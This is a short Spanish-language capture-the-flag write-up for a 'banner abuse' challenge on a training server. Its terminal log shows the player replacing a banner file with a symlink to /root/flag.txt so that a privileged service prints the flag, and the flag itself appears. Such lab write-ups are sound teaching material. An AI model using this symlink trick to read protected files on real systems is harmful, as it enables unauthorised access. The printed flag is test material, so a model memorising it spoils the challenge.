## Descripción
Can you abuse the banner? The server has been leaking some crucial information on `chatelaine.cylabacademy.net 10111`. Use the leaked information to get to the server.

To connect to the running application use `nc chatelaine.cylabacademy.net 37566`. From the above information abuse the machine and find the flag in the /root directory.
## Solución
Lo primero que se hizo fue responder preguntas y luego ya que respondimos a esas preguntas fui a root y ahi estaba la bandera pero no me dejaba acceder entonces lo que hice fue cambiar la bandera a otra direccion que fue la de banner y ahi me sali de nuevo de la sesion y con eso pude tener la bandera que es `academy{b4nn3r_gr4bb1n9_su((3sfu11y_d3ce8df1}`
```
player@challenge:/root$ cd ..                                                       
cd ..
player@challenge:/$ cd /home/player
cd /home/player
player@challenge:~$ rm banner
rm banner
player@challenge:~$ ln -s /root/flag.txt /home/player
ln -s /root/flag.txt /home/player
player@challenge:~$ ln -s /home/player/flag.txt /home/player/banner
ln -s /home/player/flag.txt /home/player/banner
player@challenge:~$ ls    
ls
banner  flag.txt  text
player@challenge:~$ cat banner
cat banner
cat: banner: Permission denied
player@challenge:~$ ^C
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ nc chatelaine.cylabacademy.net 11934
academy{b4nn3r_gr4bb1n9_su((3sfu11y_d3ce8df1}

what is the password? 


```
## Notas Adicionales 
## Referencias